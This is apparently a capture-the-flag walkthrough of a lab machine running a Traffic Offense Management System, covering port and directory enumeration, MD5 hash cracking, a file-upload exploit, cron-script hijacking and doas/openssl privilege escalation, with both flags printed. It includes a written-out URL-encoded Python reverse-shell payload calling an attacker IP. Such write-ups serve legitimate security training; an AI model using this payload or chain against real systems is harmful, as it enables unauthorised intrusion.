
----

Given IP **10.10.29.19**

**Description**
> Happy Hunting!
Tip: Enumeration is key!

---

The first thing I did was try to visit the IP to see if there was any website running.
![[Pasted image 20251102201224.png]]

We can see there's an Apache2 Ubuntu default page running.
I tried to see anything in the source code, to see if there was anything hidden.
![[Pasted image 20251102201314.png]]Just looks like a normal Apache2 page.
So I tried to find anything more, since the description says enumeration is key.

I used nmap to find any ports that might be open.
![[Pasted image 20251102201610.png]]I used this nmap command just to get the open ports quickly. Now I will do a deeper scan to see the version of the services running on the ports.
![[Pasted image 20251102201819.png]]After running nmap, we can clearly see what services are running:
1. On port 22 -> SSH 8.2p1 (doesn't look vulnerable)
2. On port 80 -> We have a simple Apache2 webpage
3. On port 445 -> We have another Apache2 webpage, let's take a look

Yep, also an Apache2 Ubuntu page.
![[Pasted image 20251102203921.png]]
I also didn't find anything in the source code.

After this I tried to find any useful hidden directory using gobuster.

I ran the command first on port 80 and we got 3 hidden directories:
1. admin
2. shadow
3. passwd
![[Pasted image 20251102204505.png]]

When I visited each one of the hidden directories, I got a base64-encoded string.
![[Pasted image 20251102204405.png]]All of them saying it was not that easy (the id_rsa file was found because directory listing was enabled on the admin endpoint).

I could try to enumerate each endpoint more, but I decided to do the same enumeration on port 445 (default for SMB, but we already saw that the protocol negotiation failed).

Let's try to find stuff on port 445.
![[Pasted image 20251102204624.png]]

Nice, we found an interesting endpoint, let's see what it has.
![[Pasted image 20251102204752.png]]We found a Traffic Offense Management System website.
Since we know the endpoint **management**, I tried to see if I could get more hidden directories from it.
![[Pasted image 20251102205108.png]]I let gobuster run for a while and we got all of these endpoints, but before exploring those I wanted to see if I could find anything useful about the dev who made the site.
![[Pasted image 20251102205200.png]]We can see it was **oretnom23**.

Yeah... I didn't find anything useful, plus the user looks legitimate so I stopped searching.

Going back to the hidden directories, we see that we have an admin login page.
![[Pasted image 20251102210436.png]]Since the purpose of this CTF is enumeration, I didn't try any SQL injection (which was actually the solution, lol).

I was searching through every hidden directory I found, and one of them had a .sql file. I decided to download and see what it had.
![[Pasted image 20251102210539.png]]
![[Pasted image 20251102210554.png]]Most of the file didn't have anything useful, except for this part.
We can see the dev inserted the username and hashed passwords into the database directly from the SQL file.
![[Pasted image 20251102210941.png]]
I tried to see what type of hash this was.
![[Pasted image 20251102211002.png]]![[Pasted image 20251102211014.png]]

Both of them are MD5 hashes. Let's crack them using john.
![[Pasted image 20251102211743.png]]Ok now that we have the login credentials, let's try to log in.
> admin -> admin123
> jsmith -> jsmith123

I tried logging in with the credentials but it didn't work with either of them.

After that I googled for an exploit for this Traffic Management webapp and I found this.
![[Pasted image 20251102221954.png]]I downloaded the file and executed it, but unfortunately it got an error.
![[Pasted image 20251102222528.png]]But viewing the file, I noticed it uploads an evil.php file that lets us use the parameter `cmd` to send commands.
![[Pasted image 20251102222650.png]]![[Pasted image 20251102222725.png]]
Boom, we have remote code execution on the server.

With this we can set up a reverse shell and wait for a connection using this payload:

> http://10.10.155.200:445//management/uploads/1762122360_evil.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.80.139%22,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27

We are able to get a reverse shell on our machine.
![[Pasted image 20251102223546.png]]
I tried going to /home/plot_admin.
![[Pasted image 20251102223933.png]]
And using cat on the user.txt but we don't have permissions.
![[Pasted image 20251102224249.png]]
I noticed a scripts directory.
Inside that directory we can find a backup.sh file.
![[Pasted image 20251102224318.png]]We can also see we have permissions to edit the folder.
I suspected that this backup.sh was being executed via a crontab, so using cat on /etc/crontab confirms my suspicion.
![[Pasted image 20251102224410.png]]
The script gets executed every minute, so we just create a new backup.sh and override the original with our malicious one.
![[Pasted image 20251102231151.png]]And with that we got a shell as plot_admin.

## USER FLAG
```
77927510d5edacea1f9e86602f1fbadb
```


Also, not that important, but we got the credentials to enter the traffic management dashboard via a local MySQL database where we found the password in the initialized.php file, but it's useless.
![[Pasted image 20251102231431.png]]

Moving forward, I tried to find SUID files that I could use.
![[Pasted image 20251102232222.png]]Fortunately I found /usr/bin/doas, and according to https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/, we can escalate privileges to root.
![[Pasted image 20251102232749.png]]
According to https://int0x33.medium.com/day-43-reverse-shell-with-openssl-1ee2574aa998 we can use openssl to read the root.txt.
![[Pasted image 20251102232852.png]]
## ROOT FLAG
```
53f85e2da3e874426fa059040a9bdcab
```
